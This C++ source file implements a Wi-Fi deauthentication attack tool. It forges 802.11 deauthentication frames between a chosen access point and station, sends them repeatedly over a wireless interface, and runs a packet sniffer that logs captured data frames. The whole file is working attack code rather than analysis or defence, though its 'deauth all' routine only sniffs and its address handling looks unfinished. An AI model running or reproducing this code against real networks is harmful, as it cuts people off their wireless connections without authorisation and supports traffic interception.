//
// Created by root on 6/30/16.
//

#include "deauth.h"

void Deauth::sendDeauth(char *input_ap, char *input_st)
{
    std::cout << "[*] Deauth Run" << std::endl;

    Dot11::address_type ap = (const unsigned char *)input_ap;
    Dot11::address_type st = (const unsigned char *)input_st;

    Dot11Deauthentication deauth = Dot11Deauthentication();
    RadioTap radio = RadioTap();

    deauth.addr1(ap);
    deauth.addr2(st);
    deauth.addr3(ap);
    radio.inner_pdu(deauth);

    PacketSender sender;

    for(int i=0; i< 10; i++){
        sender.send(radio, "wlan1");
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

}

void Deauth::deauthAll() {
    std::clog << "[*] Start Sniffing" << std::endl;
    std::thread sniffThread(&Deauth::startSniffing, this);
    sniffThread.join();
}

void Deauth::startSniffing() {
    Sniffer sniffer("wlan0", Sniffer::promisc_type::NON_PROMISC, "", true);
    sniffer.sniff_loop(make_sniffer_handler(this, &Deauth::packetHandler));
}

bool Deauth::packetHandler(PDU &pdu) {
    try{
        if(pdu.find_pdu<Dot11Data>()) {
            if(pdu.rfind_pdu<Dot11Data>().subtype() < 4) { // Frame with Data
                std::clog << "[*] Captured" << std::endl;
            }
        }
    } catch(std::runtime_error& error) {
        std::clog << "[*] Error Occured. Restart." << std::endl;
    }
    return true;
}